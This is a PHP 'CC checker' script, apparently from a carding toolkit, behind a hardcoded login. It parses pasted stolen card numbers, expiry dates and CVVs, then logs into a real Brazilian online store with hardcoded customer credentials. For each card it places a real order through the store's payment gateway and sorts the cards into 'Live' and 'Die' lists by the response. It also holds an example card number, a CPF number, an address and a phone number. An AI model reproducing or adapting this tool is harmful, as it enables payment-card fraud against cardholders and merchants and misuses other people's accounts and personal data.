<?php
error_reporting(0);
session_start();
set_time_limit(9999999);
$login='ehnoix';
$password='ehnoix';
$auth=1;
$style='<STYLE>BODY{background-color: #000000; background: url(http://oi62.tinypic.com/64mcjp.jpg);color: #C1C1C7;font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;MARGIN-TOP: 0px;MARGIN-BOTTOM: 0px;MARGIN-LEFT: 0px;MARGIN-RIGHT: 0px;margin:0;padding:0;scrollbar-face-color: #336600;scrollbar-shadow-color: #333333;scrollbar-highlight-color: #333333;scrollbar-3dlight-color: #333333;scrollbar-darkshadow-color: #333333;scrollbar-track-color: #333333;scrollbar-arrow-color: #333333;}input{background-color: #121214;font-size: 8pt;color: #C1C1C7;font-family: Tahoma;border: 1 solid #666666;}textarea{background-color: #333333;font-size: 8pt;color: #FFFFFF;font-family: Tahoma;border: 1 solid #666666;}a:link{color: #B9B9BD;text-decoration: none;font-size: 8pt;}a:visited{color: #B9B9BD;text-decoration: none;font-size: 8pt;}a:hover, a:active{color: #E7E7EB;text-decoration: none;font-size: 8pt;}td, th, p, li{font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;border-color:black;}</style>';
$header='<html><head><link rel="SHORTCUT ICON" href="http://img13.imageshack.us/img13/6793/anarchyj.png"><title>Checker Priv8 Area !</title><meta http-equiv="Content-Type" content="text/html; charset=windows-1251">'.$style.'</head><BODY leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>';
$footer='</body></html>';
if(@$_POST['action']=="exit")unset($_SESSION['an']);
if($auth==1){if(@$_POST['login']==$login && @$_POST['password']==$password)$_SESSION['an']=1;}else $_SESSION['an']='1';
if($_SESSION['an']==0){
echo $header;
echo '<br><center><tr><td colspan="2" align="center"><strong>Login Technology FULL</strong></td></tr><br><br>';
echo '<table><form method="POST"><tr><td>Username: </td><td><input type="text" name="login" value=""></td></tr><tr><td>Password: </td><td><input type="password" name="password" value=""></td></tr><tr><td></td><td><input type="submit" value="Enter"></td></tr></form></table></center>';
echo $footer;
exit;}
?>
<?php //ob_start(); ?>
<?php @ini_set('display_errors',0); ?>
<DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<head><title>TESTADOR INFOCC TECHNOLOGY CHECKER </title></head>
<style>
			body
		{
			background-color: #141619;
			font-size: 9pt;
			font-family:Verdana;
			line-height:12pt;
			color: #FFFFFF;
		}
			body,td,th {
			color: #FFFFFF;
		}
		h2
		{
			color: #FFFFFF;
		}
		h1 {
			padding: 10px 15px;
			color: red;
		}

		.main-content {
				width: 70%; height: 380px;margin: auto; background: #141619;      border-radius: 5px 5px 5px 5px; box-shadow: 0 0 3px rgba(0, 0, 0, 0.5); min-height: 380px;      position: relative;
		}
		textarea, input {
				border-radius: 5px 5px 5px 5px;
		}
		input {
				height: 14px;width: 30px;text-align: center;o
		}
			
			
		.button {
			   
		}
		.submit-button
				{
						background: #57A02C;
						border:solid 1px #57A02C;
						border-radius:5px;
								-moz-border-radius: 5px;
								-webkit-border-radius: 5px;
						-moz-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
						-webkit-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
						text-shadow: 0 -1px 1px rgba(0,0,0,0.25);
						border-bottom: 1px solid rgba(0,0,0,0.25);
						position: relative;
						color:#FFF;
						display: inline-block;
						cursor:pointer;
						font-size:13px;
						padding:3px 30px;
						height: 40px;width: 150px;
				}
        .submit-button:hover {
        background:#82D051;border:solid 1px #86CC50;
        height: 40px;width: 130px;      }
 
		#show {
				width: 70%;margin: auto;padding: 10px 10px;
		}

		.business{
			font-weight:bold;
			color:yellow;
		}
		.premier{
			font-weight:bold;
			color:#00FF00;
		}
		.verified{
			font-weight:bold;
			color:#006DB0;
		}
		.fieldset{
			border: 1px dashed #FFFFFF;
			margin-top: 20px;
		}
		.tvmit_live{
			border: 1px dashed #FFFFFF;
			color:yellow;
			font-weight:bold;
		}
		.tvmit_die{
			border: 1px dashed #FFFFFF;
			color:red;
			font-weight:bold;
		}
		#result{
			display:none;
		}
	</style>
</head>   
<?php error_reporting(0); ?>                                                             
<?php
//include("produto2.php");
    error_reporting(0);
    set_time_limit(0);
    function _curl($url,$post="",$usecookie = false) {  
            $ch = curl_init();
            if($post) {
                    curl_setopt($ch, CURLOPT_POST ,1);
                    curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
            }
            curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_NOBODY, false);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30");
			//curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            if ($usecookie) {
            curl_setopt($ch, CURLOPT_COOKIEJAR, $usecookie);
            curl_setopt($ch, CURLOPT_COOKIEFILE, $usecookie);  
            }
		//	curl_setopt($ch, CURLOPT_REFERER, 'https://www.camuflagemairsoft.com.br/customer/account/login/'); //REFERER DA SEGUNDA CHAMADO
            curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
            $result = curl_exec ($ch); // print aki
            curl_close ($ch);
            return $result;
    }
     
     
     
    function percent($num_amount, $num_total) {
    $count1 = $num_amount / $num_total;
    $count2 = $count1 * 100;
    $count = number_format($count2, 0);
    return $count;
    }
     
    function getStr($string,$start,$end){
            $str = explode($start,$string);
            $str = explode($end,$str[1]);
            return $str[0];
    }
     
    function checkMon($date,$type){
            $len = strlen($date);
            if ($type == 2){
                    if($len == 2){
                            return $date;
                    }
                    elseif($len == 1){
                            switch($date){
                                    case '01':  $date='1'; break;
                                    case '02':  $date='2'; break;
                                    case '03':  $date='3'; break;
                                    case '04':  $date='4'; break;
                                    case '05':  $date='5'; break;
                                    case '06':  $date='6'; break;
                                    case '07':  $date='7'; break;
                                    case '08':  $date='8'; break;
                                    case '09':  $date='9'; break;
							
                            }
                    }
                    return $date;
            }
            elseif ($type == 1){
                    if($len == 2){
                            switch ($date){
                                    case '1':  $date='1'; break;
                                    case '2':  $date='2'; break;
                                    case '3':  $date='3'; break;
                                    case '4':  $date='4'; break;
                                    case '5':  $date='5'; break;
                                    case '6':  $date='6'; break;
                                    case '7':  $date='7'; break;
                                    case '8':  $date='8'; break;
                                    case '9':  $date='9'; break;
                                    case '10': $date='10'; break;
                                    case '11': $date='11'; break;
                                    case '12': $date='12'; break;
                            }
                            return $date;
                    }
                    elseif($len == 1) return $date;
            }
            else return false;
    }
     
     
    function checkYear($date,$type){
            $len = strlen($date);
            if($type == 4){
                    if($len == 4) return $date;
                    elseif($len == 2) return "20".$date;
            }
            elseif($type == 2){
                    if($len == 2) return $date;
                    elseif($len == 4) return substr($date,-2);
            }
            else return false;
    }
     
    function multi_explode($pattern, $string, $standardDelimiter = ';'){
        $string = preg_replace(array($pattern, "/{$standardDelimiter}+/s"), $standardDelimiter, $string);
        return explode($standardDelimiter, $string);
    }
     
    function info($ccline,$type){
            $iscvv = 1;
            $pattern = '/[:\|\\\\\/\s]/';
            $line = multi_explode($pattern,$ccline);
           
            $typemy = explode(" ",$type);
            $typem = strlen($typemy[0]);
            $typey = strlen($typemy[1]);
           
            $amex = "AE";
            $visa = "VI";
            $mast = "MC";
            $disc = "DI";
     
            foreach($line as $col){
                    if(is_numeric($col)){
                            switch(strlen($col)){
                                    case 15:
                                            if(substr($col,0,1)==3){
                                                    $ccnum['num'] = $col;
                                                    $ccnum['type'] = $amex;
                                            }
                                            break;
                                    case 16:
                                            switch(substr($col,0,1)){
                                                    case '4':
                                                            $ccnum['num'] = $col;
                                                            $ccnum['type'] = $visa;
                                                            break;
                                                    case '5':
                                                            $ccnum['num'] = $col;
                                                            $ccnum['type'] = $mast;
                                                            break;
                                                    case '6':
                                                            $ccnum['num'] = $col;
                                                            $ccnum['type'] = $disc;
                                                            break;
                                            }
                                            break;
                                    case 1:
                                            if (($col >= 1) and ($col <=12) and (!isset($ccnum['mon']))) $ccnum['mon'] = checkMon($col,$typem); break;
                                    case 2:
                                            if (($col >= 1) and ($col <=12) and (!isset($ccnum['mon']))){
                                                    $ccnum['mon'] = checkMon($col,$typem);
                                            }
                                            elseif (($col >= 2009) and ($col <= 2030) and (isset($ccnum['mon'])) and (!isset($ccnum['year'])))    $ccnum['year'] = checkYear($col,$typey);
                                            break;
                                    case 4:
                                            if (($col >= 2009) and ($col <= 2030) and (isset($ccnum['mon'])))    $ccnum['year'] = checkYear($col,$typey);
                                            elseif ((substr($col,0,2) >= 1) and (substr($col,0,2) <=12) and (substr($col,2,2)>= 9) and (substr($col,2,2) <= 2030) and (!isset($ccnum['mon'])) and (!isset($ccnum['year']))){
                                                    $ccnum['mon'] = checkMon(substr($col,0,2),$typem);
                                                    $ccnum['year'] = checkYear(substr($col,-2),$typey);
                                            }
                                            else $ccv['cv4'] = $col;
                                            break;
                                    case 6:
                                            if ((substr($col,0,2) >= 1) and (substr($col,0,2) <=12) and (substr($col,2,4)>= 2009) and (substr($col,2,4) <= 2030)){
                            $ccnum['mon'] = checkMon(substr($col,0,2),$typem);
                                                    $ccnum['year'] = checkYear(substr($col,-2),$typey);
                        }
                        break;
                                    case 3:
                                            $ccv['cv3'] = $col;
                        break;
                            }
                    }
            }
            if($iscvv == 1){
                    if ($ccnum['type'] == $amex) $ccnum['cvv'] = $ccv['cv4'];
                    else $ccnum['cvv'] = $ccv['cv3'];
                    return $ccnum;
            }
        else return $ccnum;
    }
    function inStr($s,$as){
            $s=strtoupper($s);
            if(!is_array($as)) $as=array($as);
            for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
            return false;
    }
     
    if ($_POST['cclist']){
                    global $cookie;
                    $cookie = tempnam('tmp','avo'.rand(1000000,9999999).'tmp.txt');
     
                    $cclive = "";
                    $ccdie = "";
                    $ccerr = "";
                    $cccant = "";
                    $uncheck = "";
                    $limit = "";
                   
                    $cclist = trim($_POST['cclist']);
                    $cclist = str_replace(array("\\\"","\\'"),array("\"","'"),$cclist);
                    $cclist = str_replace("\r\r","\r",$cclist);
                    $cclist = str_replace("\n\n","\n",$cclist);
                    $cclist = explode("\n",$cclist);
     
     
           
                    $STT = 0;
                    $TOTAL = count($cclist);
           
                    for($i=0;$i<count($cclist);$i++){
                            $ccnum = info($cclist[$i],"xx yyyy");
                            $type = $ccnum['type'];
                            $ccn = $ccnum['num'];
                            $ccmon = $ccnum['mon'];
                            $ccyear = $ccnum['year'];
                            $cvv = $ccnum['cvv'];
                           
                            if ($ccn){
                                    $STT++;



	$link = "https://www.bestbronze.com.br/customer/account/login/";
	$s = _curl($link,"",$cookie);
	
    //$UserLogin = "romariocardoso2015@outlook.com";
    //$PassLogin = "admin239311";
	$link2 = "https://www.bestbronze.com.br/customer/account/loginPost/";
    $post = "login%5Busername%5D=jose1%40hotmail.com&login%5Bpassword%5D=todinho1&send=";
    //$ip = getStr($s,'name="xs" value="','"');
	$s = _curl($link2,$post,$cookie);

	$link3 = "http://www.bestbronze.com.br/checkout/cart/add/uenc/aHR0cDovL3d3dy5iZXN0YnJvbnplLmNvbS5ici9wZXNzb2FsL2x1dmEtZXNmb2xpYW50ZS1wcmUtYnJvbnplYW1lbnRvLmh0bWw,/product/8/";
	$s = _curl($link3,"",$cookie);
	
	
	$link4 = "https://www.bestbronze.com.br/firecheckout/";
	$s = _curl($link4,"",$cookie);
	
	
	$pay = "https://www.bestbronze.com.br/firecheckout/index/saveOrder/form_key/UPSZd7PFmLd4LD72/";
    $post = "billing_address_id=28980&billing%5Baddress_id%5D=475178&billing%5Bfirstname%5D=jose%20&billing%5Blastname%5D=carlos&billing%5Btipopessoa%5D=Fisica&billing%5Bcpfcnpj%5D=095.679.466-12&billing%5Brg%5D=&billing%5Bempresa%5D=&billing%5Bie%5D=&billing%5Bpostcode%5D=06453-005&billing%5Bstreet%5D%5B%5D=Cal%C3%A7ada%20das%20An%C3%AAmonas&billing%5Bstreet%5D%5B%5D=21&billing%5Bstreet%5D%5B%5D=&billing%5Bstreet%5D%5B%5D=Condom%C3%ADnio%20Centro%20Comercial%20Alphaville&billing%5Bcountry_id%5D=BR&billing%5Bcity%5D=Barueri&billing%5Bregion_id%5D=508&billing%5Bregion%5D=&billing%5Btelephone%5D=(11)%209939-2993&billing%5Bcelular%5D=&billing%5Buse_for_shipping%5D=1&shipping%5Bsame_as_billing%5D=1&shipping_address_id=28980&shipping%5Baddress_id%5D=475179&shipping%5Bfirstname%5D=jose%20&shipping%5Blastname%5D=carlos&shipping%5Bpostcode%5D=06453-005&shipping%5Bstreet%5D%5B%5D=Cal%C3%A7ada%20das%20An%C3%AAmonas&shipping%5Bstreet%5D%5B%5D=21&shipping%5Bstreet%5D%5B%5D=&shipping%5Bstreet%5D%5B%5D=Condom%C3%ADnio%20Centro%20Comercial%20Alphaville&shipping%5Bcountry_id%5D=BR&shipping%5Bcity%5D=Barueri&shipping%5Bregion_id%5D=508&shipping%5Bregion%5D=&shipping%5Btelephone%5D=(11)%209939-2993&shipping%5Bcelular%5D=&shipping_method=pedroteixeira_correios_41068&payment%5Bmethod%5D=braspag_creditcard&payment%5Btype%5D=CreditCard&payment%5Bcc_owner%5D=jose%20silva%20carlos&payment%5Bcc_type%5D=$type&payment%5Bcc_number%5D=$ccn&payment%5Bcc_exp_month%5D=$ccmon&payment%5Bcc_exp_year%5D=$ccyear&payment%5Bcc_cid%5D=$cvv&payment%5Bcc_parcelamento%5D=0&coupon%5Bremove%5D=0&coupon%5Bcode%5D=";
    $s = _curl($pay,$post,$cookie);  
	
	$pay2 = "https://www.bestbronze.com.br/braspag/index/redirect/";
	$s = _curl($pay2,"",$cookie);
	
	
	
	
                                              if(inStr($s,"Obrigado por sua compra")){

                                                    echo "$STT/$TOTAL | <div class='row'>  <div class='col-md-12'> <div class='alert alert-danger'> <font color=green>Live | ".$cclist[$i]." "." | Info ==> $info |\n</font> #TechnologyChecker\n</font><br></div>  </div>  </div>";  
                                                    $cclive .= $cclist[$i]."\n";
                                            }
			
								
                                            elseif(inStr($s,"negada")){
												
                                                echo "$STT/$TOTAL | <div class='row'>  <div class='col-md-12'> <div class='alert alert-danger'> <font color=red>Die | ".$cclist[$i]." "." | #TechnologyChecker\n</font><br></div>  </div>  </div>";  
                                                    $ccdie .= $cclist[$i]."\n";
                                            }
				
                                             elseif(inStr($s,"Duplicada")){
                                              
                                              echo "$STT/$TOTAL | <div class='row'>  <div class='col-md-12'> <div class='alert alert-info'> <font color=red>Retestar | ".$cclist[$i]." "." | <font color=blue> #TechnologyChecker</font><br></div>  </div>  </div>";  
                                                    $ccdie .= $cclist[$i]."\n" ;;
                                            }													
					
						                   elseif(inStr($s,"Aprovada")){
                                              
                                              echo "$STT/$TOTAL | <div class='row'>  <div class='col-md-12'> <div class='alert alert-info'> <font color=green>Live | ".$cclist[$i]." "." | <font color=blue> #TechnologyChecker</font><br></div>  </div>  </div>";  
                                                    $cclive .= $cclist[$i]."\n" ;;
                                            }
                                            else{

							                  	echo "$STT/$TOTAL | <div class='row'>  <div class='col-md-12'> <div class='alert alert-info'> <font color=orange>Nao Testada | ".$cclist[$i]." "." | Info ==> $info |\n</font> <font color=blue> #TechnologyChecker</font><br></div>  </div>  </div>";  
                                                    $cccant .= $cclist[$i]."\n" ;;
                                            }
                                           
                                    }
                                    flush();
                    }
                    unlink($cookie);
     
                    $per1 = percent(count(explode("\n",$cclive))-1,count($cclist));
                    $per2 = percent(count(explode("\n",$ccdie))-1,count($cclist));
                    $per3 = percent(count(explode("\n",$ccinva))-1,count($cclist));
                    $per4 = percent(count(explode("\n",$ccexp))-1,count($cclist));
                    $per5 = percent(count(explode("\n",$cccant))-1,count($cclist));
                    $per6 = percent(count(explode("\n",$limit))-1,count($cclist));
                    echo "<br><br><center><input class='submit-button' type='submit' value='NOVAMENTE' onclick='location.replace(\"?\")'/></center>";
                    echo "<center>";
                    if($cclive!=""){
                            echo "<h2><font color=green>Live</font> $per1 % (".(count(explode("\n",$cclive))-1)."/".count($cclist).")</h2>";
                             echo "<textarea wrap=off rows=10 style=\"width:90%\">$cclive</textarea><br>";
                    }
                    if($ccdie!=""){
                            echo "<h2><font color=red>Die</font> $per2 % (".(count(explode("\n",$ccdie))-1)."/".count($cclist).")</h2>";
                            echo "<textarea wrap=off rows=10 style=\"width:90%\">$ccdie</textarea><br>";
                    }
                    if($ccinva!=""){
                            echo "<h2><font color=red>Invalid</font> $per3 % (".(count(explode("\n",$ccinva))-1)."/".count($cclist).")</h2>";
                            echo "<textarea wrap=off rows=10 style=\"width:90%\">$ccinva</textarea><br>";
                    }
                    if($ccexp!=""){
                            echo "<h2><font color=red>Exp</font> $per4 % (".(count(explode("\n",$ccexp))-1)."/".count($cclist).")</h2>";
                            echo "<textarea wrap=off rows=10 style=\"width:90%\">$ccexp</textarea><br>";
                    }
                    if($cccant!=""){
                            echo "<h2><font color=orange>Re-Testar</font> $per5 % (".(count(explode("\n",$cccant))-1)."/".count($cclist).")</h2>";
                            echo "<textarea wrap=off rows=10 style=\"width:90%\">$cccant</textarea><br>";
                    }
     
    }
     
    else{

    ?>
    <form method="POST" action="">
          <fieldset>
              <legend>LISTA:</legend>
                <form action="" method=post name=f>
     
            <p align="center">
            <textarea id="cclist" name="cclist" class="tab-pane fade active in" class="textarea" style="width: 978px; height: 210px">4551821022189157|04|2017|305| AVISO O FORMATO E ESSE AI NAO COLOQUE OUTRO QUE NAO TESTA!</textarea><br>Remover Duplicadas<input name=dup type=checkbox value=1 checked><br>
                                           <input class="submit-button" type="submit" name="submit" value="CHECK">
     
            </p>
     
            </form>
    </fieldset>
            <?php }?>

